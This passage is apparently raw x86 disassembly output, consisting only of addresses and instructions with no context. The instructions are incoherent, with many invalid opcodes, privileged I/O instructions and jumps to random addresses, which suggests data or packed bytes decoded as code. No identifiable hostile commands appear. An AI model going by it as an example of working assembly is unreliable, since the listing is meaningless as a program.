  40d421:	and    dl,BYTE PTR [eax+0x4b]
  40d424:	inc    BYTE PTR [edx-0xb]
  40d427:	(bad)  
  40d428:	faddp  st(3),st
  40d42a:	lods   eax,DWORD PTR ds:[esi]
  40d42b:	dec    eax
  40d42c:	sar    DWORD PTR [edx],1
  40d42e:	push   edi
  40d42f:	sbb    eax,0x444dceb7
  40d434:	push   es
  40d435:	lahf   
  40d436:	not    al
  40d438:	outs   dx,BYTE PTR ds:[esi]
  40d439:	div    DWORD PTR [eax+0x74]
  40d43c:	popf   
  40d43d:	lods   eax,DWORD PTR ds:[esi]
  40d43e:	rol    BYTE PTR [eax+0x60],0xae
  40d442:	xor    eax,0x5e89c6de
  40d447:	xchg   edx,eax
  40d448:	scas   al,BYTE PTR es:[edi]
  40d449:	and    dl,BYTE PTR [ebx+0x502681a2]
  40d44f:	add    esp,eax
  40d451:	pop    edx
  40d452:	retf   0x3d15
  40d455:	imul   ebp,DWORD PTR ds:0x214382d1,0xffffff86
  40d45c:	or     edx,0xffffffc9
  40d45f:	inc    DWORD PTR [ebp+0x2b65611]
  40d465:	adc    BYTE PTR [ebp+ebx*4+0x1dd81986],cl
  40d46c:	add    eax,0xf3244a6c
  40d471:	es das 
  40d473:	mov    ecx,0x9990adc
  40d478:	imul   ebp,DWORD PTR [esi+0x2a],0x6dd1344a
  40d47f:	ins    DWORD PTR es:[edi],dx
  40d480:	pop    DWORD PTR [ebx+esi*8]
  40d483:	test   al,0x63
  40d485:	cmp    DWORD PTR [eax-0x7c],esp
  40d488:	cmp    edi,ebx
  40d48a:	adc    eax,0xb58f15ec
  40d48f:	xchg   ebp,eax
  40d490:	cli    
  40d491:	sbb    eax,0xe5d5a3ca
  40d496:	ins    BYTE PTR es:[edi],dx
  40d497:	pop    edx
  40d498:	cli    
  40d499:	retf   0x402d
  40d49c:	mov    ds:0x29d64bd4,al
  40d4a1:	adc    eax,0x541b04ef
  40d4a6:	aaa    
  40d4a7:	fisubr DWORD PTR [ecx]
  40d4a9:	sbb    eax,0x13ca6212
  40d4ae:	dec    esi
  40d4af:	imul   edx,DWORD PTR [esi-0x74],0x7d6ffc38
  40d4b6:	(bad)  
  40d4b7:	mov    ebx,0x32b938b9
  40d4bc:	or     ecx,ebp
  40d4be:	inc    eax
  40d4bf:	adc    eax,0xe05a584
  40d4c4:	es out dx,al
  40d4c6:	cli    
  40d4c7:	push   eax
  40d4c8:	fs sti 
  40d4ca:	cli    
  40d4cb:	scas   eax,DWORD PTR es:[edi]
  40d4cc:	adc    BYTE PTR [ebp+0x721ecfe],dh
  40d4d2:	mov    ss,WORD PTR [edi]
  40d4d4:	jecxz  0x40d500
  40d4d6:	bound  eax,QWORD PTR [edi]
  40d4d8:	mov    ds:0x6fb613f6,al
  40d4dd:	adc    al,0x3
  40d4df:	sub    DWORD PTR [esi],0xa272ff91
  40d4e5:	push   ds
  40d4e6:	mov    ch,0x28
  40d4e8:	out    0x3,al
  40d4ea:	shr    bh,0x4
  40d4ed:	inc    ebx
  40d4ee:	pop    ss
  40d4ef:	xor    dl,BYTE PTR [eax-0x72]
  40d4f2:	jge    0x40d56e
  40d4f4:	out    dx,al
  40d4f5:	hlt    
  40d4f6:	out    dx,al
  40d4f7:	dec    ecx
  40d4f8:	push   ebx
  40d4f9:	mov    eax,0x6eefc180
  40d4fe:	and    BYTE PTR [ebx-0xb],al
  40d501:	mov    bl,0x59
  40d503:	pusha  
  40d504:	pushf  
  40d505:	adc    al,BYTE PTR [edx+edi*1+0x1744c049]
  40d50c:	pop    esi
  40d50d:	outs   dx,BYTE PTR ds:[esi]
  40d50e:	pushf  
  40d50f:	out    dx,al
  40d510:	(bad)  
  40d511:	xor    al,0x1e
  40d513:	mov    BYTE PTR [ebp-0x76dcf691],ah
  40d519:	ins    BYTE PTR es:[edi],dx
  40d51a:	daa    
  40d51b:	fwait
  40d51c:	xor    DWORD PTR [esi+0x3157bbcd],edi
  40d522:	sar    BYTE PTR [ebx],1
  40d524:	xchg   ebx,eax
  40d525:	call   0xb8403f04
  40d52a:	pushf  
  40d52b:	or     al,0xd7
  40d52d:	cld    
  40d52e:	and    eax,0x516237c3
  40d533:	jno    0x40d4bf
  40d535:	ret    
  40d536:	sub    DWORD PTR [edx],esp
  40d538:	ret    
  40d539:	shl    BYTE PTR [edi-0x1a],0xc4
  40d53d:	retf   0x310f
  40d540:	xchg   ecx,eax
  40d541:	or     edx,DWORD PTR ds:0x3e017458
  40d547:	scas   al,BYTE PTR es:[edi]
  40d548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d549:	xor    cl,bl
  40d54b:	retf   
  40d54c:	std    
  40d54d:	sbb    ah,BYTE PTR [ecx+0x763016c8]
  40d553:	imul   esi,DWORD PTR [ebp-0x327715b1],0x67
  40d55a:	icebp  
  40d55b:	sub    bh,bl
  40d55d:	inc    ecx
  40d55e:	or     BYTE PTR [eax-0x67],bl
  40d561:	inc    eax
  40d562:	retf   0x5326
  40d565:	sub    BYTE PTR [eax],bl
  40d567:	mov    esp,0xfc2a8969
  40d56c:	lds    ebp,FWORD PTR [edx+0x64e22b78]
  40d572:	js     0x40d591
  40d574:	xchg   ebx,eax
  40d575:	ja     0x40d5e9
  40d577:	lock les esp,FWORD PTR [ebp-0x9d411c9]
  40d57e:	pop    eax
  40d57f:	inc    esi
  40d580:	or     ch,BYTE PTR [eax-0x26]
  40d583:	cmp    esp,DWORD PTR [eax]
  40d585:	adc    eax,0x2784a24e
  40d58a:	mov    ebp,0xd6e22371
  40d58f:	popf   
  40d590:	pop    esp
  40d591:	int    0x76
  40d593:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40d595:	daa    
  40d596:	ins    DWORD PTR es:[edi],dx
  40d597:	sub    edi,DWORD PTR cs:[esi+0x6702baa6]
  40d59e:	xchg   ebp,eax
  40d59f:	repnz push edi
  40d5a1:	pop    edi
  40d5a2:	lea    ecx,[esi+0x57]
  40d5a5:	fsubr  st(0),st
  40d5a7:	push   esp
  40d5a8:	xchg   esi,eax
  40d5a9:	jnp    0x40d5b5
  40d5ab:	(bad)
  40d5b0:	jg     0x40d55a
  40d5b2:	shl    BYTE PTR ss:[eax+0xf],1
  40d5b6:	push   edx
  40d5b7:	inc    ecx
  40d5b8:	and    DWORD PTR [edi-0x6da0fc6e],0xffffffce
  40d5bf:	mov    ah,BYTE PTR [eax+0x5a]
  40d5c2:	or     DWORD PTR [edx+edi*1-0x60993785],edx
  40d5c9:	push   edi
  40d5ca:	rol    BYTE PTR [ebp-0xf],cl
  40d5cd:	add    ebp,esi
  40d5cf:	push   esp
  40d5d0:	bswap  esp
  40d5d2:	fnstcw WORD PTR [edi]
  40d5d4:	and    al,0x82
  40d5d6:	jmp    0x2d6e:0x59b7aca1
  40d5dd:	sbb    DWORD PTR [ebx-0x7afccc5b],edi
  40d5e3:	icebp  
  40d5e4:	mul    DWORD PTR [eax+0x75]
  40d5e7:	add    eax,0x758217b3
  40d5ec:	inc    eax
  40d5ed:	add    BYTE PTR [ecx],al
  40d5ef:	xlat   BYTE PTR ds:[ebx]
  40d5f0:	rol    BYTE PTR [ebp+0x3c],cl
  40d5f3:	clc    
  40d5f4:	mov    ebx,0x6ee31c7d
  40d5fa:	and    al,0xe2
  40d5fd:	mov    WORD PTR [edi],?
  40d5ff:	and    DWORD PTR [eax+0xa],esi
  40d602:	jnp    0x40d635
  40d604:	or     ecx,DWORD PTR [eax]
  40d606:	fld    TBYTE PTR [eax]
  40d608:	scas   al,BYTE PTR es:[edi]
  40d609:	loope  0x40d593
  40d60b:	jp     0x40d651
  40d60d:	push   ss
  40d60e:	aad    0x99
  40d610:	mov    esi,DWORD PTR [ecx-0x52]
  40d613:	cli    
  40d614:	xor    BYTE PTR [ebx-0x2e12a853],ah
  40d61a:	loop   0x40d62c
  40d61c:	repnz mov edi,0xf0c90b8a
  40d622:	daa    
  40d623:	(bad)  
  40d624:	es mov dh,0xb4
  40d627:	lds    esi,FWORD PTR [ecx-0x64b5300a]
  40d62d:	dec    ecx
  40d62e:	je     0x40d625
  40d630:	mov    DWORD PTR [ecx+0x7],esp
  40d633:	mov    ch,0x70
  40d635:	pop    esi
  40d636:	fld    DWORD PTR [ecx-0x79]
  40d639:	xchg   edi,eax
  40d63a:	inc    esi
  40d63b:	aas    
  40d63c:	adc    eax,0xc0db8dd6
  40d641:	jp     0x40d6bb
  40d643:	cld    
  40d644:	test   al,0xe4
  40d646:	or     esi,DWORD PTR [edx-0x63d606c6]
  40d64c:	mov    ah,0xa5
  40d64e:	ins    DWORD PTR es:[edi],dx
  40d64f:	rcl    BYTE PTR [esi-0x4c],cl
  40d652:	pop    ebp
  40d653:	aaa    
  40d654:	mov    ebx,0x48723295
  40d659:	mov    BYTE PTR [ecx-0x62],0xa6
  40d65d:	push   edi
  40d65e:	push   ebp
  40d65f:	ins    DWORD PTR es:[edi],dx
  40d660:	(bad)  
  40d662:	test   eax,esp
  40d664:	sub    eax,0xb8620d5
  40d669:	imul   edi,DWORD PTR [esi+0x61c35c00],0x11b280e0
  40d673:	pop    ss
  40d674:	js     0x40d6f1
  40d676:	paddusw mm3,QWORD PTR [eax+0x45]
  40d67a:	shl    ah,0xdb
  40d67d:	enter  0x42c7,0x23
  40d681:	popa   
  40d682:	out    0xec,eax
  40d684:	je     0x40d60f
  40d686:	cmp    al,0xc3
  40d688:	dec    ebx
  40d689:	idiv   DWORD PTR [eax+0x23]
  40d68c:	mov    al,ds:0x9455fc01
  40d691:	sub    DWORD PTR [ecx+0x54],ebp
  40d694:	adc    al,cl
  40d696:	xchg   ebx,eax
  40d697:	int3   
  40d698:	leave  
  40d699:	ret    
  40d69a:	jmp    0x40d668
  40d69c:	adc    cl,bl
  40d69e:	push   es
  40d69f:	dec    ebp
  40d6a0:	pusha  
  40d6a1:	sbb    BYTE PTR [eax+esi*8+0x7a0c029e],ch
  40d6a8:	lock pop ds
  40d6aa:	and    edx,DWORD PTR [ebx]
  40d6ac:	cld    
  40d6ad:	jg     0x40d6e4
  40d6af:	adc    BYTE PTR [ecx-0x52],cl
  40d6b2:	sysexit 
  40d6b4:	dec    esp
  40d6b5:	mov    eax,ds:0x3398a7a9
  40d6ba:	aad    0x9d
  40d6bc:	enter  0x7f08,0x78
  40d6c0:	mov    esp,0x59288f2b
  40d6c5:	stos   BYTE PTR es:[edi],al
  40d6c6:	adc    ebx,eax
  40d6c8:	add    bl,bl
  40d6ca:	cdq    
  40d6cb:	fld    TBYTE PTR [edi-0x26]
  40d6ce:	sub    bh,BYTE PTR [ebp-0x2886362]
  40d6d4:	out    dx,al
  40d6d5:	mov    DWORD PTR [ebp-0x1a],edx
  40d6d8:	sub    eax,0xdec89cdd
  40d6dd:	mov    bh,0xc4
  40d6df:	rcr    DWORD PTR [ebp-0x59e5dbdc],1
  40d6e5:	fnsetpm(287 only) 
  40d6e7:	mov    ds:0x4707d6bb,eax
  40d6ec:	add    cl,BYTE PTR [edx+edi*2]
  40d6ef:	mov    al,ds:0xb23459db
  40d6f4:	test   DWORD PTR [ebp-0x80],edx
  40d6f7:	and    al,0x81
  40d6f9:	ja     0x40d74b
  40d6fb:	les    eax,FWORD PTR [ecx+0x46]
  40d6fe:	mov    edx,0x3ee31858
  40d703:	int3   
  40d704:	(bad)  
  40d705:	outs   dx,BYTE PTR ds:[esi]
  40d706:	jno    0x40d6c7
  40d708:	scas   eax,DWORD PTR es:[edi]
  40d709:	hlt    
  40d70a:	out    dx,al
  40d70b:	jp     0x40d70a
  40d70d:	xor    al,0xe3
  40d70f:	jp     0x40d704
  40d711:	fisubr WORD PTR [edx+0x74af53eb]
  40d717:	fdiv   DWORD PTR [eax]
  40d719:	dec    ecx
  40d71a:	sub    eax,0x205bfdf7
  40d71f:	fs std 
  40d721:	retf   
  40d722:	lock pop ebx
  40d724:	add    eax,0x5d3374d7
  40d729:	mov    al,0xc4
  40d72b:	jbe    0x40d72f
  40d72d:	mov    dh,BYTE PTR [edx-0x1e]
  40d730:	loope  0x40d782
  40d732:	in     eax,dx
  40d733:	ins    DWORD PTR es:[edi],dx
  40d734:	push   esp
  40d735:	icebp  
  40d736:	fnstsw WORD PTR [esi+0x76057320]
  40d73c:	jb     0x40d6e3
  40d73e:	or     edx,0xffffffbc
  40d741:	lds    ebp,FWORD PTR [edx+edx*2+0x4c]
  40d745:	xchg   BYTE PTR [edi+0xe],ch
  40d748:	cmp    edx,ecx
  40d74a:	fdivr  st(1),st
  40d74c:	pushf  
  40d74d:	dec    ebp
  40d74e:	xchg   DWORD PTR [ecx+0x47],esp
  40d751:	dec    esi
  40d752:	sbb    al,0x4e
  40d754:	xchg   ebx,eax
  40d755:	mov    esi,0x52eb15ff
  40d75a:	inc    eax
  40d75b:	sbb    DWORD PTR [ebp-0x6e2ef285],0xfd64c615
  40d765:	pop    edi
  40d766:	enter  0x78bc,0xba
  40d76a:	pop    ecx
  40d76b:	jl     0x40d7d2
  40d76d:	mov    edi,0x49867d5a
  40d772:	pop    edx
  40d773:	in     eax,0xa6
  40d775:	clc    
  40d776:	add    BYTE PTR [ebp+0x38],bl
  40d779:	(bad)
  40d77c:	js     0x40d722
  40d77e:	push   cs
  40d77f:	outs   dx,BYTE PTR ds:[esi]
  40d780:	scas   al,BYTE PTR es:[edi]
  40d781:	scas   al,BYTE PTR es:[edi]
  40d782:	outs   dx,DWORD PTR ds:[esi]
  40d783:	cli    
  40d784:	test   eax,0x8d28513b
  40d789:	repnz mov dh,0x5b
  40d78c:	xchg   edi,eax
  40d78d:	and    bh,0x69
  40d790:	ret    
  40d791:	mov    eax,0xb8c3aa70
  40d796:	test   DWORD PTR [ebp+0x5d],esp
  40d799:	cdq    
  40d79a:	ret    0x46cf
  40d79d:	jecxz  0x40d741
  40d79f:	in     al,0x4f
  40d7a1:	in     eax,0x4
  40d7a3:	enter  0x6f06,0xf7
  40d7a7:	aam    0xbe
  40d7a9:	jl     0x40d827
  40d7ab:	pop    es
  40d7ac:	imul   eax,DWORD PTR [eax+eax*4],0x43d8af2d
  40d7b3:	addr16 pop edx
  40d7b5:	ss jge 0x40d77b
  40d7b8:	pop    esp
  40d7b9:	mov    bl,0x16
  40d7bb:	fsub   DWORD PTR [edx]
  40d7bd:	out    dx,eax
  40d7be:	iret   
  40d7bf:	jbe    0x40d74d
  40d7c1:	mov    al,ds:0xb5888a5b
  40d7c6:	lock out dx,ax
  40d7c9:	pop    edi
  40d7ca:	mov    WORD PTR [ebp-0x17],fs
  40d7cd:	icebp  
  40d7ce:	jae    0x40d777
  40d7d0:	adc    DWORD PTR [ebx+edx*1-0x31d41da1],ecx
  40d7d7:	outs   dx,BYTE PTR ds:[esi]
  40d7d8:	ret    
  40d7d9:	loopne 0x40d852
  40d7db:	pop    ebx
  40d7dc:	mov    edx,0x206d90ec
  40d7e1:	lea    esi,[ecx+ebx*2-0x61]
  40d7e5:	test   DWORD PTR [esi],ecx
  40d7e7:	sbb    al,cl
  40d7e9:	jl     0x40d846
  40d7eb:	sub    al,ah
  40d7ed:	nop
  40d7ee:	sbb    edi,DWORD PTR [ebp+ebx*8+0x6f]
  40d7f2:	retf   0x9500
  40d7f5:	fisttp WORD PTR [eax]
  40d7f7:	mov    al,0x1a
  40d7f9:	jbe    0x40d7a1
  40d7fb:	fst    QWORD PTR [ebp+0x10]
  40d7fe:	push   cs
  40d7ff:	dec    edi
  40d800:	fnsave [edi]
  40d802:	cmc    
  40d803:	jl     0x40d81f
  40d805:	inc    esi
  40d806:	jno    0x40d874
  40d808:	lods   eax,DWORD PTR ds:[esi]
  40d809:	mov    ds:0x5f691343,al
  40d80e:	(bad)  
  40d80f:	and    al,0x71
  40d811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d812:	mov    dl,BYTE PTR [edx]
  40d814:	repz fld DWORD PTR [ebp+edx*8-0x6f]
  40d819:	fs inc esp
  40d81b:	push   ss
  40d81c:	sub    DWORD PTR cs:[ecx],edx
  40d81f:	and    eax,0x8cca3e7e
  40d824:	mov    ds:0xa794beee,al
  40d829:	mov    al,ds:0x92f85d48
  40d82e:	repnz out 0x3a,eax
  40d831:	sar    BYTE PTR [ecx+0x635d2e52],1
  40d837:	mov    BYTE PTR [edx+edx*2+0x63],ah
  40d83b:	nop
  40d83c:	ss mov esp,0xdf978e42
  40d842:	mov    bh,0xc
  40d844:	out    0x6,al
  40d846:	iret   
  40d847:	cdq    
  40d848:	dec    ecx
  40d849:	and    DWORD PTR [eax+0x41],edi
  40d84c:	push   ebp
  40d84d:	out    0xd6,eax
  40d84f:	(bad)  
  40d850:	or     ch,dh
  40d852:	mov    ecx,0x977a4684
  40d857:	push   edx
  40d858:	xchg   edx,ebx
  40d85a:	cld    
  40d85b:	in     eax,0xe0
  40d85d:	out    dx,eax
  40d85e:	iret   
  40d85f:	addr16 in al,0x9c
  40d862:	xchg   edi,eax
  40d863:	xor    DWORD PTR [ecx],esi
  40d865:	(bad)  
  40d867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d868:	mov    ecx,0x63af5249
  40d86d:	mov    esp,0xa938aecd
  40d872:	jle    0x40d8c3
  40d874:	call   0x5a99:0x957805a7
  40d87b:	lock add bl,al
  40d87e:	adc    BYTE PTR [eax+ebp*4],dl
  40d881:	push   0x51
  40d883:	test   DWORD PTR [edx+0x48],edi
  40d886:	imul   ebp,DWORD PTR [edx],0xf6ab8e19
  40d88c:	jae    0x40d908
  40d88e:	outs   dx,DWORD PTR ds:[esi]
  40d88f:	pop    edx
  40d890:	ins    DWORD PTR es:[edi],dx
  40d891:	fbstp  TBYTE PTR [eax-0x27]
  40d894:	fwait
  40d895:	subps  xmm3,XMMWORD PTR [edx-0x3b2d9b92]
  40d89c:	lock mov ecx,0x93552cbb
  40d8a2:	mov    WORD PTR [esi],ss
  40d8a4:	sbb    DWORD PTR [eax+edi*4-0x17410],ecx
  40d8ab:	push   cs
  40d8ac:	arpl   WORD PTR [ecx+ecx*2-0x61],di
  40d8b0:	pop    eax
  40d8b1:	and    cl,bl
  40d8b3:	xor    esi,DWORD PTR [edx]
  40d8b5:	inc    eax
  40d8b6:	cmp    eax,0xbdbd40a6
  40d8bb:	std    
  40d8bc:	mov    ecx,DWORD PTR [edx-0x2d]
  40d8bf:	xchg   edx,eax
  40d8c0:	or     ah,BYTE PTR [ebx]
  40d8c2:	xchg   ebx,eax
  40d8c3:	add    bh,BYTE PTR [ecx+0x63abfa4]
  40d8c9:	not    DWORD PTR [ebx-0x22]
  40d8cc:	pop    eax
  40d8cd:	inc    ecx
  40d8ce:	test   DWORD PTR [ebp+0x5bd0b43],edx
  40d8d4:	push   es
  40d8d5:	ss push esi
  40d8d7:	cmp    al,0x6b
  40d8d9:	fdivr  QWORD PTR [ebp-0x5e]
  40d8dc:	pop    esp
  40d8dd:	cmp    al,0x8e
  40d8df:	nop
  40d8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8e1:	sub    DWORD PTR [edi+eax*2+0x6a080d85],eax
  40d8e8:	aaa    
  40d8e9:	adc    al,0x44
  40d8eb:	xchg   esi,eax
  40d8ec:	enter  0x8982,0xfc
  40d8f0:	stc    
  40d8f1:	and    bh,BYTE PTR [ebp+0x49]
  40d8f4:	push   ecx
  40d8f5:	lds    ebx,FWORD PTR [ecx-0x7c497ed1]
  40d8fb:	pop    ss
  40d8fc:	std    
  40d8fd:	fstp   st(1)
  40d8ff:	clc    
  40d900:	or     ecx,DWORD PTR [esi]
  40d902:	adc    al,0x99
  40d904:	adc    eax,0xc5b852d8
  40d909:	std    
  40d90a:	lods   al,BYTE PTR ds:[esi]
  40d90b:	nop
  40d90c:	pop    ebx
  40d90d:	lds    esp,FWORD PTR [ecx]
  40d90f:	mov    esp,0x14cff0c6
  40d914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d915:	call   0xc4a9a021
  40d91a:	mov    ax,0xc3ad
  40d91e:	loope  0x40d95f
  40d920:	jmp    0xa55c:0xfb0775
  40d927:	inc    esp
  40d928:	mov    bl,0x66
  40d92a:	inc    edi
  40d92b:	mov    ch,0x38
  40d92d:	daa    
  40d92e:	call   DWORD PTR [ecx]
  40d930:	(bad)  
  40d931:	sub    al,0xff
  40d933:	pusha  
  40d934:	jecxz  0x40d913
  40d936:	adc    DWORD PTR [edi+0x3f],edi
  40d939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d93a:	sbb    al,BYTE PTR [esi-0x303e86ff]
  40d940:	xchg   esp,eax
  40d941:	push   0xffffffb2
  40d943:	sub    al,0x6f
  40d945:	add    ch,dl
  40d947:	fadd   st,st(5)
  40d949:	dec    eax
  40d94a:	data16 aam 0x5d
  40d94d:	test   cl,0x1
  40d950:	or     ebx,DWORD PTR ds:[edi+0x74fb111d]
  40d957:	(bad)  
  40d959:	mul    BYTE PTR [ebx+0x79]
  40d95c:	stos   DWORD PTR es:[edi],eax
  40d95d:	es sar bh,0xe4
  40d961:	jg     0x40d93a
  40d963:	xor    DWORD PTR [esi-0x63],eax
  40d966:	lock stos BYTE PTR es:[edi],al
  40d968:	in     eax,0xf8
  40d96a:	hlt    
  40d96b:	mov    edx,0xdc23dcde
  40d970:	xchg   DWORD PTR [ebx],eax
  40d972:	aam    0x61
  40d974:	or     bh,BYTE PTR [bp+si-0x23]
  40d978:	pop    esi
  40d979:	pop    DWORD PTR [esi-0x5a]
  40d97c:	pop    ebx
  40d97d:	xchg   DWORD PTR [eax-0x14],ecx
  40d980:	push   esi
  40d981:	outs   dx,BYTE PTR ds:[esi]
  40d982:	ds out dx,eax
  40d984:	pop    ss
  40d985:	sbb    ebx,DWORD PTR [esi-0x4511d3e2]
  40d98b:	call   0xfdc2626c
  40d990:	iret   
  40d991:	fidiv  DWORD PTR [ecx]
  40d993:	pop    edx
  40d994:	jne    0x40d9a4
  40d996:	mov    ecx,0xa77e9593
  40d99b:	xor    al,0x23
  40d99d:	scas   eax,DWORD PTR es:[edi]
  40d99e:	sub    dh,BYTE PTR [ecx-0x18909c12]
  40d9a4:	(bad)  
  40d9a5:	not    DWORD PTR [ecx-0x48]
  40d9a8:	sub    ebp,DWORD PTR [esi+eiz*2+0x2f]
  40d9ac:	(bad)  
  40d9ae:	in     al,0x4a
  40d9b0:	stos   BYTE PTR es:[edi],al
  40d9b1:	mov    DWORD PTR ds:0xe4049598,edx
  40d9b7:	in     al,0xf8
  40d9b9:	xchg   DWORD PTR [ecx+0x7b],edi
  40d9bc:	adc    eax,0x305496db
  40d9c1:	aas    
  40d9c2:	xor    ecx,DWORD PTR [ebx-0x2d0f5391]
  40d9c8:	mov    eax,ds:0xd3888334
  40d9cd:	xchg   esp,eax
  40d9ce:	pop    edx
  40d9cf:	dec    esi
  40d9d0:	std    
  40d9d1:	sub    dh,bl
  40d9d3:	sti    
  40d9d4:	adc    BYTE PTR [edx+0x76],0xfc
  40d9d8:	mov    al,ds:0xed7fbd7d
  40d9dd:	inc    edi
  40d9de:	pusha  
  40d9df:	pop    ebx
  40d9e0:	cmp    ebx,DWORD PTR [eax+ebx*1+0x1ad19527]
  40d9e7:	aam    0x0
  40d9e9:	clc    
  40d9ea:	fdivrp st(5),st
  40d9ec:	scas   al,BYTE PTR es:[edi]
  40d9ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9ee:	cs cmp esp,ebp
  40d9f1:	stc    
  40d9f2:	rcr    ebp,1
  40d9f4:	mov    cl,BYTE PTR [edx-0x77]
  40d9f7:	sti    
  40d9f8:	xchg   esi,eax
  40d9f9:	mov    DWORD PTR [edx],0x9d0f5a9
  40d9ff:	nop
  40da00:	fcomip st,st(7)
  40da02:	mov    ebx,0x4cdb44ff
  40da07:	js     0x40d9da
  40da09:	fimul  WORD PTR [ebp-0x58]
  40da0c:	inc    edx
  40da0d:	xlat   BYTE PTR ds:[ebx]
  40da0e:	and    eax,0xaac25798
  40da13:	sbb    edx,0x66
  40da16:	pusha  
  40da17:	pop    edx
  40da18:	call   0xf0b4238a
  40da1d:	rcl    DWORD PTR [ebp+0x11],1
  40da20:	xchg   esi,eax
  40da21:	sub    edi,edi
  40da23:	xor    BYTE PTR [edx*8+0x636a3cf],ch
  40da2a:	jno    0x40da53
  40da2c:	or     BYTE PTR [esi+edx*2-0x410448f4],dh
  40da33:	stos   BYTE PTR es:[edi],al
  40da34:	adc    eax,0xb892beed
  40da39:	outs   dx,DWORD PTR ds:[esi]
  40da3a:	xchg   edi,eax
  40da3b:	jl     0x40d9d5
  40da3d:	sbb    DWORD PTR [ebx+0x21],esi
  40da40:	sub    eax,DWORD PTR [edi+edi*4-0x64]
  40da44:	pop    es
  40da45:	pop    edi
  40da46:	xchg   BYTE PTR [ebx+0xe],bh
  40da49:	popa   
  40da4a:	popa   
  40da4b:	or     DWORD PTR [esi+0x6f75a151],edi
  40da51:	js     0x40d9ff
  40da53:	mov    gs,WORD PTR [eax+0x7b]
  40da56:	mov    esp,DWORD PTR [esp+edi*8-0x36]
  40da5a:	lods   eax,DWORD PTR ds:[esi]
  40da5b:	or     al,0x4e
  40da5d:	pop    eax
  40da5e:	test   DWORD PTR [ebp+0x56],edx
  40da61:	sahf   
  40da62:	mov    esi,0xa61ece61
  40da67:	cld    
  40da68:	lea    edx,[ecx-0x7c1b8a2]
  40da6e:	aaa    
  40da6f:	stos   BYTE PTR es:[edi],al
  40da70:	cli    
  40da71:	ret    
  40da72:	fist   WORD PTR [ebp+0x2b]
  40da75:	sbb    eax,0xb4e4611a
  40da7a:	inc    esp
  40da7b:	std    
  40da7c:	or     eax,0x9765bb77
  40da81:	dec    ebp
  40da82:	rcl    DWORD PTR [ecx],1
  40da84:	push   es
  40da85:	mov    ebp,0xaf6a8d8
  40da8a:	aaa    
  40da8b:	aaa    
  40da8c:	inc    esp
  40da8d:	xchg   ebx,eax
  40da8e:	jno    0x40dacf
  40da90:	outs   dx,DWORD PTR ds:[esi]
  40da91:	lods   al,BYTE PTR ds:[esi]
  40da92:	or     al,0xd
  40da94:	or     al,0x75
  40da96:	mov    dh,0xe1
  40da98:	cmp    ebp,ebx
  40da9a:	add    eax,0x1bfdbe4a
  40da9f:	mov    cl,0x5f
  40daa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa2:	mov    ch,0x6f
  40daa4:	add    BYTE PTR ds:0x380d11d4,al
  40daaa:	sbb    BYTE PTR ds:0xc69f7108,cl
  40dab0:	fadd   st,st(6)
  40dab2:	sub    edx,eax
  40dab4:	outs   dx,DWORD PTR ds:[esi]
  40dab5:	jg     0x40dad0
  40dab7:	pop    ebx
  40dab8:	mov    dl,0x9c
  40daba:	stos   BYTE PTR es:[edi],al
  40dabb:	xlat   BYTE PTR ds:[ebx]
  40dabc:	jl     0x40db30
  40dabe:	xor    DWORD PTR [edi+0x14],ebp
  40dac1:	mov    al,ds:0x9b9cd916
  40dac6:	ins    BYTE PTR es:[edi],dx
  40dac7:	mov    dl,0x90
  40dac9:	push   edi
  40daca:	scas   al,BYTE PTR es:[edi]
  40dacb:	and    BYTE PTR [eax+0x1c3b8a48],dl
  40dad1:	cmc    
  40dad2:	add    BYTE PTR [eax-0x340d1b43],0x22
  40dad9:	push   es
  40dada:	popf   
  40dadb:	xlat   BYTE PTR ds:[ebx]
  40dadc:	out    0xbe,eax
  40dade:	jno    0x40da6c
  40dae0:	add    BYTE PTR [edi+0x48d8c7a6],al
  40dae6:	enter  0x3f9c,0xc3
  40daea:	mov    ds,WORD PTR [ecx+0x46]
  40daed:	and    edi,DWORD PTR [ecx]
  40daef:	dec    ebx
  40daf0:	cwde   
  40daf1:	pop    ebx
  40daf2:	mov    ch,0xb6
  40daf4:	pop    ss
  40daf5:	mov    ds:0x814d9786,al
  40dafa:	push   ebp
  40dafb:	sbb    bl,cl
  40dafd:	xchg   edi,eax
  40dafe:	xchg   ebp,eax
  40daff:	mov    esp,0x9b93b55b
  40db04:	dec    esi
  40db05:	mov    esi,0xdd0e91d7
  40db0a:	and    DWORD PTR [ebp+ecx*4-0x73bfcefd],ebp
  40db11:	mov    eax,DWORD PTR [edi+esi*1]
  40db14:	(bad)  
  40db15:	fidiv  DWORD PTR [edi]
  40db17:	and    DWORD PTR fs:[esi],ecx
  40db1a:	and    ecx,DWORD PTR [esi-0x6a]
  40db1d:	pop    es
  40db1e:	mov    BYTE PTR [ebx],0x64
  40db21:	xchg   edi,eax
  40db22:	repz (bad) 
  40db25:	daa    
  40db26:	enter  0xef97,0x37
  40db2a:	or     esi,DWORD PTR [esi-0x7f2843c8]
  40db30:	bound  esp,QWORD PTR [ecx-0x7c]
  40db33:	inc    eax
  40db34:	xlat   BYTE PTR ds:[ebx]
  40db35:	jmp    0x40db4a
  40db37:	and    eax,0xe2639234
  40db3c:	sub    ecx,ebp
  40db3e:	jno    0x40db07
  40db40:	les    ebx,FWORD PTR [eax+eiz*1+0xf]
  40db44:	jno    0x40db2b
  40db46:	jae    0x40db7e
  40db48:	dec    esi
  40db49:	cmp    edx,DWORD PTR [ebx+0xa]
  40db4c:	push   cs
  40db4d:	push   edx
  40db4e:	or     eax,0x8927a243
  40db53:	iret   
  40db54:	mov    bl,0x68
  40db56:	sti    
  40db57:	mov    eax,0x53f42bc9
  40db5c:	adc    BYTE PTR [eax-0x501d9197],0x6d
  40db63:	sbb    ebp,DWORD PTR [ebp+0x1fde09f5]
  40db69:	push   ebx
  40db6a:	fs cmc 
  40db6c:	mov    fs,WORD PTR [ecx+0x1]
  40db6f:	aam    0x22
  40db71:	mov    cl,0xdb
  40db73:	fistp  QWORD PTR [edx]
  40db75:	cmp    al,0xf1
  40db77:	push   edi
  40db78:	aad    0xb6
